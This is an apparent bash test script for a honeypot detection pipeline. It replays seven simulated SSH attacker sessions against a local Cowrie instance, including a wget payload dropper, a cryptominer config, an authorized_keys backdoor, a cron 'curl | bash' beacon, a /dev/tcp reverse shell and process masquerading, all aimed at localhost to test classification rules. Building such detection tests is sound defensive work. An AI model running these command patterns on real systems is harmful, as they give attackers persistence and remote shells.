#!/bin/bash
# =============================================================================
# CyberSentinel AI — realistic_attack_sim.sh
#
# Higher-fidelity companion to zero_day_sim.sh. Where that script used
# arbitrary filler commands to exercise the UNCLASSIFIED code path,
# this one uses command SHAPES actually documented in real-world Cowrie
# honeypot research and threat-intel writeups — IoT botnet recruitment
# (Mirai/Gafgyt family), XMRig-style cryptomining droppers, SSH
# authorized_keys backdoors, cron beacons, the classic /dev/tcp reverse
# shell, process masquerading, and a fileless python dropper. These are
# the actual command patterns publicly reported from real attacks against
# SSH honeypots — not invented examples.
#
# Every payload here is inert:
#   - "downloads" pull from YOUR OWN payload container (127.0.0.1-scoped,
#     never the real internet)
#   - the reverse shell targets 127.0.0.1 on a closed port, so it fails
#     the connection in <1s and does nothing
#   - nothing is actually executed as background/miner/persistent — script
#     content is written and inspected, never run for real
#   - all of it runs inside Cowrie's emulated filesystem, not your real
#     Kali host
#
# Point of this script: some of these ARE now caught by the registry
# extensions added alongside it (T1053 cron, T1098 SSH-key persistence,
# T1496 cryptomining) — you should see those in ttp_records.json. Two are
# left DELIBERATELY unmatched (process masquerading / T1036, and the
# fileless python dropper) because nobody has written a rule for them yet
# — that's honest, not a bug. Don't "fix" the UNCLASSIFIED result for
# those without adding a real T1036 rule to ttp_extract.py first.
#
# Usage:
#   ./realistic_attack_sim.sh
#   ./run_pipeline.sh          — then check the technique frequency table
# =============================================================================
set -uo pipefail

HONEYPOT_IP="127.0.0.1"
HONEYPOT_PORT="2222"
SSH_OPTS="-p ${HONEYPOT_PORT} \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PasswordAuthentication=yes \
  -o PubkeyAuthentication=no \
  -o BatchMode=no \
  -o ConnectTimeout=5 \
  -o LogLevel=ERROR"

ssh_cmd() {
  local user="$1" pass="$2" cmds="$3"
  sshpass -p "$pass" ssh $SSH_OPTS "${user}@${HONEYPOT_IP}" bash -s <<< "$cmds" 2>/dev/null
}

if ! nc -z -w3 "$HONEYPOT_IP" "$HONEYPOT_PORT" 2>/dev/null; then
  echo "[!] Cowrie not reachable at ${HONEYPOT_IP}:${HONEYPOT_PORT} — run docker-compose up -d first"
  exit 1
fi

echo "================================================================"
echo "  CyberSentinel AI — Realistic Attacker TTP Simulation"
echo "  7 sessions modeled on documented real-world honeypot findings"
echo "================================================================"

echo ""
echo "[1/7] IoT botnet recruitment (Mirai/Gafgyt-family pattern)"
echo "      architecture fingerprint + busybox-style payload pull"
ssh_cmd "root" "password123" '
cat /proc/cpuinfo 2>/dev/null | grep -i model || echo "cpuinfo not readable"
uname -m
wget -q http://payload:8000/payload.sh -O /tmp/.rsync 2>/dev/null || echo "pull failed (expected if payload container down)"
chmod +x /tmp/.rsync 2>/dev/null || true
rm -f /tmp/.rsync
exit
' >/dev/null

echo "[2/7] XMRig-style cryptomining dropper"
echo "      hidden config dir + stratum pool string (T1496)"
ssh_cmd "root" "password123" '
mkdir -p /tmp/.x 2>/dev/null
echo "url=stratum+tcp://simulated-pool.local:3333" > /tmp/.x/config.json 2>/dev/null
wget -q http://payload:8000/payload.sh -O /tmp/.x/xmrig 2>/dev/null || echo "miner pull failed (expected)"
echo "simulated: nohup ./xmrig --config=config.json (not actually run)"
rm -rf /tmp/.x
exit
' >/dev/null

echo "[3/7] SSH authorized_keys backdoor (T1098)"
echo "      classic persistence — append attacker key for passwordless re-entry"
ssh_cmd "root" "password123" '
mkdir -p ~/.ssh 2>/dev/null
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC_SIMULATED_NOT_A_REAL_KEY_placeholder attacker@sim" >> ~/.ssh/authorized_keys 2>/dev/null || echo "authorized_keys not writable"
exit
' >/dev/null

echo "[4/7] Cron beacon persistence (T1053)"
echo "      re-establish access on a timer, survives session end"
ssh_cmd "root" "password123" '
(crontab -l 2>/dev/null; echo "* * * * * curl -s http://payload:8000/payload.sh | bash") | crontab - 2>/dev/null || echo "crontab not available"
crontab -l 2>/dev/null || true
exit
' >/dev/null

echo "[5/7] Classic /dev/tcp reverse shell (bash builtin, no netcat needed)"
echo "      targets 127.0.0.1:4444 — closed port, fails safely in <1s"
ssh_cmd "root" "password123" '
timeout 1 bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1" 2>/dev/null || echo "reverse shell connect failed (expected — nothing listening)"
exit
' >/dev/null

echo "[6/7] Process masquerading (rename to look like a kernel thread)"
echo "      T1036 — deliberately NOT in the registry yet, should land UNCLASSIFIED"
ssh_cmd "root" "password123" '
exec -a "[kworker/0:1]" sleep 0 2>/dev/null || echo "exec -a not supported in this shell"
ps -o comm= -p $$ 2>/dev/null || true
exit
' >/dev/null

echo "[7/7] Fileless python dropper (in-memory, no disk artifact)"
echo "      common real evasion shape — should land UNCLASSIFIED (uncommon interpreter)"
ssh_cmd "root" "password123" '
python3 -c "print(\"fileless_python_dropper_simulated\")" 2>/dev/null || echo "python3 not available"
exit
' >/dev/null

echo ""
echo "================================================================"
echo "  Done. Now run:  ./run_pipeline.sh"
echo "  Expect to see: T1496, T1098, T1053 in the technique frequency"
echo "  table (new rules), plus 2 UNCLASSIFIED sessions (masquerading"
echo "  + fileless python — genuinely uncovered, not a bug)."
echo "================================================================"
